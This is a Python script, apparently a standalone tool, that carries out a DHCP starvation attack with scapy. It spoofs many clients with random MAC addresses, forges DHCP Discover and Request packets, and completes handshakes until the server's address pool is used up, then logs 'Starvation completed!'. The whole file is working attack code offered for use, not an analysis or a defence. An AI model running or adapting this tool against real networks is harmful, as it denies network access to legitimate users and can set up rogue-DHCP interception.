from scapy.all import *
from threading import Thread
from utils import is_valid_MAC, IPV4_BROADCAST, IPV4_NETWORK, MAC_BROADCAST, starve_logger
import argparse
import sys
from time import sleep

class SpoofHost():
    '''
    Class representing a legitimate host on the network as far as the DHCP server is concerned.
    Will perform a standard DHCP handshake to receive an IP address.
    '''
    def __init__(self, host_id: int = 0, desired_mac: str = None):
        if desired_mac is not None and is_valid_MAC(desired_mac):
            self._mac_addr = desired_mac
        else:
            self._mac_addr = RandMAC()
            
        try:
            self._host_id = int(host_id)
        except ValueError:
            self._host_id = 0
            
        self.filter = f"udp and (port 67 or 68)"
        self._ipv4_addr = None

        # print(self.filter)


    @property
    def mac(self):
        return self._mac_addr


    @property
    def ip_addr(self):
        if self._ipv4_addr is not None:
            return self._ipv4_addr


    def sniff_callback(self, sniffed_pkt):
        '''
        Sniffs for DHCP packets, responding accordingly.
        '''
        if DHCP in sniffed_pkt and sniffed_pkt[DHCP].options[0][1] == 2:
            # match DHCP OFFER
            self.dhcp_server_ip = sniffed_pkt[IP].src
            self.dhcp_server_mac = sniffed_pkt[Ether].src
            self._ipv4_addr = sniffed_pkt[BOOTP].yiaddr
            self._recent_transaction_id = sniffed_pkt[BOOTP].xid

            starve_logger.info(f"HOST {self._host_id} - TRANSACTION {self._recent_transaction_id}: DHCP OFFER from {self.dhcp_server_mac}.")
            starve_logger.info(f"HOST {self._host_id} - TRANSACTION {self._recent_transaction_id}: Sending DHCP REQUEST.")
            req = self.request_pkt
            sendp(req, verbose=0)

        if DHCP in sniffed_pkt and sniffed_pkt[DHCP].options[0][1] == 5:
            # match DHCP ACK
            self.dhcp_server_ip = sniffed_pkt[IP].src
            self.dhcp_server_mac = sniffed_pkt[Ether].src

            starve_logger.info(f"HOST {self._host_id} - TRANSACTION {self._recent_transaction_id}: DHCP ACK from {self.dhcp_server_mac}.")
            starve_logger.info(f"HOST {self._host_id} - TRANSACTION {self._recent_transaction_id}: DHCP handshake completed.")


    @staticmethod
    def sniff_thread(self):
        '''
        Thread that the sniffer runs in.
        '''
        sniff(filter=self.filter, prn=self.sniff_callback, store=0)

    
    def starve(self):
        '''
        Performs the actual starving functionality.
        '''
        # self.discover_pkt.show()
        self._sniffer = Thread(target=self.sniff_thread, args=(self,))
        self._sniffer.start()

        try:
            disc = self.discover_pkt
            sendp(disc, verbose=0)
        except KeyboardInterrupt:
            self._sniffer.join()


    @property
    def discover_pkt(self):
        '''
        Crafts a DHCP Discover packet corresponding to this host.
        '''
        ether = Ether(src=self._mac_addr, dst=MAC_BROADCAST)
        ip = IP(src=IPV4_NETWORK, dst=IPV4_BROADCAST)
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=self._mac_addr, xid=RandInt())
        dhcp = DHCP(options=[("message-type", "discover"), "end"])

        return ether / ip / udp / bootp / dhcp


    @property
    def request_pkt(self):
        '''
        Crafts a DHCP Request packet to respond to server upon receiving DHCP Offer.
        '''
        ether = Ether(src=self._mac_addr, dst=MAC_BROADCAST)
        ip = IP(src=IPV4_NETWORK, dst=IPV4_BROADCAST)
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=RandString(16, b"0123456789abcdef"), xid=self._recent_transaction_id)
        dhcp = DHCP(options=[("message-type", "request"), ("requested_addr", self._ipv4_addr), ("server_id", self.dhcp_server_ip), "end"])

        return ether / ip / udp / bootp / dhcp


if __name__ == '__main__':
    parser = argparse.ArgumentParser(f"{sys.argv[0]}")
    parser.add_argument("--num-hosts", dest="hosts", type=int, default=5, help="Number of DHCP clients to spoof.")
    parser.add_argument("--delay", dest="delay", type=float, default=0.5, help="Delay between each host initiating DHCP handshake.")
    parser.add_argument("--store-hosts", dest="store", action="store_true", help="Store existing hosts")
    args = parser.parse_args()

    if args.store:
        host_macs = set()
    
    for i in range(args.hosts):
        host = SpoofHost(host_id=i)
        if args.store:
            host_macs.add(host.mac)
        host.starve()
        sleep(args.delay)
    
    starve_logger.info("Starvation completed!")
